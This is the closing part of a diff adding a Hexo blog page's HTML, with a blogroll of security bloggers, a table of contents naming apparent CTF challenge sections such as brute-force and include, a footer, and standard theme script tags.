+                    <a href="http://sec2hack.com/" title="Wfox" target="_blank">Wfox</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.codemonster.cn/" title="Xishir" target="_blank">Xishir</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://eternalsakura13.com/" title="Sakura" target="_blank">Sakura</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://math1as.com/" title="Math1as" target="_blank">Math1as</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://blog.thecosmos.cn/" title="Cosmos" target="_blank">Cosmos</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://blog.csdn.net/whklhhhh" title="奈沙夜影" target="_blank">奈沙夜影</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://blog.csdn.net/PeterZ1997/" title="PeterZ" target="_blank">PeterZ</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.virzz.com/" title="Virink" target="_blank">Virink</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://blog.changwei.me/" title="昌维" target="_blank">昌维</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://white.xmutsec.com" title="White" target="_blank">White</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://cismon.net/" title="CismonX" target="_blank">CismonX</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.lsafe.org/" title="lixin" target="_blank">lixin</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://wzsite.cn/" title="Wz" target="_blank">Wz</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.blogsir.com.cn/" title="江sir" target="_blank">江sir</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://greyd0g.github.io/" title="greyd0g" target="_blank">greyd0g</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://brucetg.github.io/" title="Brucetg" target="_blank">Brucetg</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.get1t.cn/" title="FraMeQ" target="_blank">FraMeQ</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.smallflower.xin/" title="小花" target="_blank">小花</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://iosmosis.github.io/" title="iosmosis" target="_blank">iosmosis</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://processor.pub/" title="Processor" target="_blank">Processor</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.lmxspace.com/" title="l1nk3r" target="_blank">l1nk3r</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.evi1s.com/index.php/links.html" title="Map1e" target="_blank">Map1e</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://pvp.im/" title="清枫" target="_blank">清枫</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.itfire.cn/" title="仓鼠" target="_blank">仓鼠</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.sk15.net/" title="一苇" target="_blank">一苇</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.t1h2ua.cn/" title="T1h2ua" target="_blank">T1h2ua</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://qtfreet.com/" title="qtfreet00" target="_blank">qtfreet00</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://tea9.xyz/" title="茶茶" target="_blank">茶茶</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#爆破-1"><span class="nav-number">1.</span> <span class="nav-text">爆破-1</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#爆破-2"><span class="nav-number">2.</span> <span class="nav-text">爆破-2</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#爆破-3"><span class="nav-number">3.</span> <span class="nav-text">爆破-3</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#include"><span class="nav-number">4.</span> <span class="nav-text">include</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Zone"><span class="nav-number">5.</span> <span class="nav-text">Zone</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#OneThink"><span class="nav-number">6.</span> <span class="nav-text">OneThink</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2017 &mdash; <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Cytosine</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a></div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.3"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.3"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.3"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
